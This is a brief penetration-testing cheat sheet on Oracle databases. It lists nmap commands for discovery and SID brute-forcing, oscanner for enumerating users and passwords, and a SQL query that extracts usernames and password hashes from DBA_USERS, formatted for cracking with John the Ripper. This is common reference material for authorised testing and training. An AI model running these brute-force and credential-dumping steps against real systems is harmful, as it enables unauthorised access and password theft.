# ORACLE Database Cheat Sheet
This module will provide us with enough information to get going with a compromised Oracle database.

## Database Discovery
Nmap can be used to discover a database running on our target system like so,

`nmap -A -p 1521 (TARGET IP ADDRESS)`

## Database Enumeration
Once discovered, we can perform some light and heavy enumeration. We must be careful not to lock out any accounts.

### NMAP NSE Scripts
Nmap can be used to brute force a SID from an Oracle service. This is essentially the Database name. I would recommend building your own oracle-sids file to use from your other service / os / etc enumeration results. Even the hostname / domain names can be added to this file.

`nmap --script oracle-sid-brute -p 1521 (TARGET IP ADDRESS)`

### OScanner
[oscanner](https://tools.kali.org/vulnerability-analysis/oscanner) is a tool that can be used to enumerate users and passwords from a database.

`root@kali:~# oscanner -s (TARGET IP ADDRESS)`

## SQL Syntax
We can issue the following commands with an interface to the database. This could be SQLPlus, or DBeaver.

### Get all Usernames and Hashed Passwords:
To concatenate the usernams and passwords with a colon to be used by John the Ripper, do:

`SELECT Username || ':' || PASSWORD AS credentials FROM DBA_USERS;`
